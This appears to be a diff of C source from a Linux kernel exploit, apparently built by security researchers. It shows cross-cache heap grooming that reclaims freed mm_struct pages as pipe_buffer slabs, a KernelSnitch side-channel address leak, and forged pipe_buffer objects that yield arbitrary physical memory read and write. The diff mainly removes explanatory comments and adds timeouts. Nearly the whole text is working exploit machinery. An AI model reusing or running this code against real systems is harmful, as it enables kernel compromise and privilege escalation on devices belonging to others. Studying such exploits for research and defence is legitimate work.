@@ -2,37 +2,12 @@
 
 #define PIPE_SHAPE_ROUNDS 0
 #define PHYSRW_PROOF_OFF 0x7000
-/*
- * Proof scribble area: the kmalloc slack of our own pipe_buffer
- * object. A 16-slot ring uses 640B of the 1KB object; bytes
- * [640,1024) are unused slack we own, so proof writes can never
- * corrupt foreign kernel memory. proof64 uses +0x100 (max 904B).
- */
 #define PIPE_PROOF_OFF (PIPE_STAGE2_SLOTS * 40)
 #define PHYS_READ_TAG "nebusec_70687973727730"
 #define PHYS_WRITE_TAG "nebusec_70687973727731"
 #define PHYS64_SEED 0x306365737562656eULL
 #define PHYS64_NEXT 0x316365737562656eULL
 
-/*
- * Reclaim strategy: cross-cache at ORDER-2, no coalescing required.
- * Stage 1: mm_struct(order-2) -> buddy -> sk_buff(true order-2 frag page)
- * Stage 2: sk_buff(order-2 release) -> buddy -> pipe_buffer slab(kmalloc-1k, order-2)
- *
- * kmalloc-1k slabs are order-2 on this kernel (NR_CPUS=6 ->
- * min_objects=16 -> calculate_order(1024)=2, 16 objs/slab, verified
- * by /sys/kernel/slab/kmalloc-rcl-1k/order=2 on device), exactly the
- * mm_struct slab order. The freed mm_struct slab page is reclaimed
- * directly at order-2 and handed to the pipe_buffer slab at order-2;
- * the fragile "order-2 pair merges into order-3" step is gone.
- *
- * 16 slots * 40B = 640B -> kmalloc-1k (this kernel has no per-memcg
- * kmalloc caches; __GFP_ACCOUNT does not change cache selection).
- * drain/slot-fill use AF_UNIX sk_buff 1k objects (896B linear-head
- * allocs) instead of pipes, so pipe_user_pages_soft (16384 pages)
- * only has to cover the reclaim pipes: 192 * 16 slots = 3072 <= 16384.
- * (CONFIG_SYSVIPC is off on this kernel, so msg_msg is unusable.)
- */
 /*
  * The target kernel only has a PCP (per-cpu pageset) for order-0;
  * order-2 allocations always go straight to the buddy freelists, so a
@@ -159,14 +134,8 @@ void shape_pipe_cache(void) {
 
 /*
  * prepare_pipe_buffer_page — single-process cross-cache reclaim.
- *
- * Stage 1: mm_struct (order-2) -> buddy -> sk_buff (true order-2 page)
- * Stage 2: sk_buff release     -> buddy -> pipe_buffer slab (cg-1k, order-2)
- *
- * Both stages operate at order-2, so no buddy coalescing is needed.
- * With all kmalloc-cg-1k slots full, the pipe resize that follows each
- * sk_buff release creates a new slab from buddy HEAD (LIFO), so the
- * just-freed reclaim page is always taken.
+   Stage 1: mm_struct (order-2) -> buddy -> sk_buff (true order-2 page)
+   Stage 2: sk_buff release     -> buddy -> pipe_buffer slab (cg-1k, order-2)
  */
 uintptr_t prepare_pipe_buffer_page(void) {
   struct mm_ctx prep, spray, pre, post;
@@ -180,8 +149,8 @@ uintptr_t prepare_pipe_buffer_page(void) {
   sk_buff_init();
 
   /*
-   * Raise RLIMIT_MEMLOCK to allow larger pipe sizes.
-   * PIPE_STAGE2_SLOTS=16 needs 64KB pipe capacity.
+   Raise RLIMIT_MEMLOCK to allow larger pipe sizes.
+   PIPE_STAGE2_SLOTS=16 needs 64KB pipe capacity.
    */
   {
     struct rlimit rlim;
@@ -232,10 +201,10 @@ uintptr_t prepare_pipe_buffer_page(void) {
     kill_child(post.childs[i]);
   for (size_t i = 0; i < spray.mm_cnt; i++)
     kill_child(spray.childs[i]);
-  SYSCHK(waitpid(leak_child, NULL, 0));
+  waitpid_timed(leak_child, KSNITCH_COLLISION_TIMEOUT_MS, NULL);
 
   if (!kernelsnitch_collisions_ready()) {
-    pr_error("pipe KernelSnitch collision finding failed\n");
+    pr_warning("pipe KernelSnitch collision finding failed\n");
     cleanup_kernelsnitch();
     for (size_t i = 0; i < prep.mm_cnt; i++) {
       if (prep.memfds[i] > 0) close(prep.memfds[i]);
@@ -249,11 +218,6 @@ uintptr_t prepare_pipe_buffer_page(void) {
     return 0;
   }
 
-  /*
-   * Buddy drain: consume order-2 pages to deplete the freelists.
-   * (Includes the 12 former "PCP drain" allocations — see the comment
-   * at BUDDY_DRAIN_COUNT.)
-   */
   static int buddy_drain_sv[BUDDY_DRAIN_COUNT][2];
   for (int i = 0; i < BUDDY_DRAIN_COUNT; i++) {
     sk_buff_prepare(buddy_drain_sv[i]);
@@ -270,13 +234,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
 
   pin_to_core(CORE);
 
-  /*
-   * Stage 1: free mm_structs, reclaim as sk_buff frag page.
-   * Freed order-2 slab pages land on the (drained) order-2 buddy
-   * freelist head; each 16384B AF_UNIX sendmsg (data_len=16384,
-   * npages=4 -> one order-2 compound frag page, see SKB_O2_DATA_SZ)
-   * takes one LIFO. No order-3 coalescing involved.
-   */
+ 
   for (size_t i = 0; i < pre.mm_cnt; i++)
     SYSCHK(close(pre.memfds[i]));
   for (size_t i = 0; i < post.mm_cnt - 1; i++)
@@ -292,7 +250,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch mm_struct leak failed\n");
+    pr_warning("pipe KernelSnitch mm_struct leak failed\n");
     for (size_t i = 0; i < prep.mm_cnt; i++) {
       if (prep.memfds[i] > 0) close(prep.memfds[i]);
       kill_child(prep.childs[i]);
@@ -319,17 +277,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
   for (int i = 0; i < SLOT_FILL_COUNT; i++)
     sk_buff_alloc_cg1k(sk_fill_svs[i]);
 
-  /*
-   * Interleave sk_buff release + a FULL slab of pipe resizes: each
-   * freed order-2 page lands at buddy HEAD; the first of the next
-   * 16 resizes creates a new slab from buddy HEAD (reclaiming the
-   * page) and the remaining 15 fill it completely. The page spends
-   * only microseconds on the buddy freelist, so stray cg-1k/order-2
-   * allocations (the cg-1k cache is hot: every default pipe() in
-   * the system allocates 640B from it) have almost no chance to
-   * steal the page, and every object in the resulting slab is one
-   * of our own pipes.
-   */
+ 
   int pipe_idx = 0;
   for (int r = 0; r < RECLAIM_ATTEMPTS; r++) {
     sk_buff_release(reclaim_svs[r]);
@@ -426,16 +374,7 @@ int pipe_cache_matches(uint64_t slab_cache) {
   if (slab_cache == 0) {
     return 0;
   }
-  /*
-   * Accept ONLY kmalloc-1k (normal row). This kernel has no
-   * per-memcg kmalloc caches (enum kmalloc_cache_type has no
-   * KMALLOC_CGROUP; kmalloc_type() ignores __GFP_ACCOUNT), so our
-   * GFP_KERNEL_ACCOUNT pipe_buffer arrays land in plain kmalloc-1k.
-   * The old "cgroup" row reads were actually the DMA row and could
-   * never match; the working runs all matched kmalloc_normal_1k.
-   * Foreign-slab rejection is handled by the batch fingerprint in
-   * find_pipe_buffer(), not by cache-type filtering.
-   */
+  
   return slab_cache == kmalloc_normal_1k_cache ||
          slab_cache == kmalloc_pipe_cache;
 }
@@ -461,11 +400,7 @@ int pipe_reclaim_cache_gate(int fd) {
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
   kmalloc_normal_4k_cache =
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 12];
-  /*
-   * No per-memcg kmalloc caches on this kernel — row 2 is DMA and
-   * must not be used for matching. Keep the legacy variables zeroed
-   * so a stale DMA address can never cause a false match.
-   */
+
   kmalloc_cgroup_1k_cache = 0;
   kmalloc_cgroup_2k_cache = 0;
   kmalloc_cgroup_4k_cache = 0;
@@ -475,12 +410,7 @@ int pipe_reclaim_cache_gate(int fd) {
   kmalloc_pipe_cache =
     kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
   pr_debug("kmalloc_pipe_cache: %lx\n", kmalloc_pipe_cache);
-  /*
-   * The cg-1k slab is order-2: scan exactly the leaked order-2 page.
-   * (The stage-1 sk_buff reclaim takes precisely this page, so a
-   * match is expected at off == 0; wider scans only risk matching a
-   * neighbouring foreign cg-1k slab.)
-   */
+  
   for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PAGE_SIZE) {
     uintptr_t page = pipebuf_page_base + off;
     uintptr_t head = direct_to_head_page(fd, page);
@@ -612,17 +542,7 @@ int find_pipe_buffer(int fd, uintptr_t base) {
     ncand++;
   }
 
-  /*
-   * Batch fingerprint: this slab was created by one batch of 16
-   * consecutive pipe resizes (release r -> pipes[16r..16r+15]) and
-   * the marker writes set len = pipe_index + 1, so a slab that is
-   * really ours has ~16 candidates whose lens are 16 CONSECUTIVE
-   * values inside [1, PIPE_RECLAIM]. A foreign cg-1k slab (other
-   * processes' default pipes — same cache, same 640B size) cannot
-   * reproduce this. Without this check a fully-foreign slab passes
-   * the per-object fingerprint and we would forge a fake
-   * pipe_buffer over somebody else's live pipe (kernel panic).
-   */
+  
   int best = 0;
   for (int k = 1; k <= PIPE_RECLAIM; k++) {
     int cnt = 0;
@@ -677,11 +597,7 @@ int pipe_phys_read(
 
   ssize_t got = read(pipefd[0], out, len);
   int ok = got == (ssize_t)len;
-  /*
-   * If the restore fails, the forged pipe_buffer stays in place and
-   * any later pipe op/close will put_page() the proof page —
-   * a delayed kernel panic. Fail loudly instead of continuing.
-   */
+  //If the restore fails, the forged pipe_buffer stays in place and any later pipe op/close will put_page() the proof page — a delayed kernel panic. Fail loudly instead of continuing.
   if (kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) !=
       (ssize_t)sizeof(saved)) {
     pr_error("pipe_phys_read: restore failed, slot left forged!\n");
@@ -714,7 +630,7 @@ int pipe_phys_write(
 
   ssize_t wrote = write(pipefd[1], data, len);
   int ok = wrote == (ssize_t)len;
-  /* See pipe_phys_read: a failed restore leaves a live forged slot. */
+
   if (kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) !=
       (ssize_t)sizeof(saved)) {
     pr_error("pipe_phys_write: restore failed, slot left forged!\n");
@@ -797,8 +713,15 @@ int install_pipe_physrw(int fd) {
   if (pipebuf_page_base == 0) {
     atomic_store(&pipe_prepare_done, 0);
     atomic_store(&pipe_prepare_request, 1);
-    while (!atomic_load(&pipe_prepare_done)) {
+    time_t wait_start = time(NULL);
+    while (!atomic_load(&pipe_prepare_done) &&
+           time(NULL) - wait_start < PIPE_PREPARE_WAIT_SEC) {
       usleep(10000);
+    }
+    if (!atomic_load(&pipe_prepare_done)) {
+      pr_warning("timed out waiting for pipe page prepare\n");
+      atomic_store(&pipe_prepare_request, 0);
+      return 0;
     }
   }
 
@@ -825,15 +748,6 @@ int install_pipe_physrw(int fd) {
     pipe_cache_gate_ok = 2;
   }
 
-  /*
-   * Proof region: the kmalloc slack of our OWN pipe_buffer object
-   * (bytes [640,1024) of its 1KB slot — see PIPE_PROOF_OFF). The
-   * old proof used page_base + 0x7000, which is OUTSIDE the 16KB
-   * (order-2) fops heap page: every successful gate scribbled the
-   * seed/tag into an unrelated neighbouring kernel page — a random
-   * delayed kernel panic that only became frequent once the gate
-   * started passing reliably.
-   */
   uintptr_t proof_addr = pipebuf_addr + PIPE_PROOF_OFF;
   uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
   if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
@@ -852,14 +766,6 @@ int install_pipe_physrw(int fd) {
   pr_debug("phys step probed read done ok=%d idx=%d\n",
            physrw_read_ok, pipebuf_pipe_idx);
 
-  /*
-   * Fast-abort: if the proof read did not return our seed, the
-   * probed pipe_buffer does NOT belong to pipe_fds_reclaim[idx]
-   * (foreign cg-1k object). Do NOT run the write/read64/write64
-   * proofs — each of them would forge a fake pipe_buffer over a
-   * live foreign object again, and every forge window is a
-   * potential kernel panic.
-   */
   if (!physrw_read_ok ||
       memcmp(physrw_readback, seed, sizeof(seed)) != 0) {
     pr_debug("phys step probe readback mismatch, aborting before write tests\n");
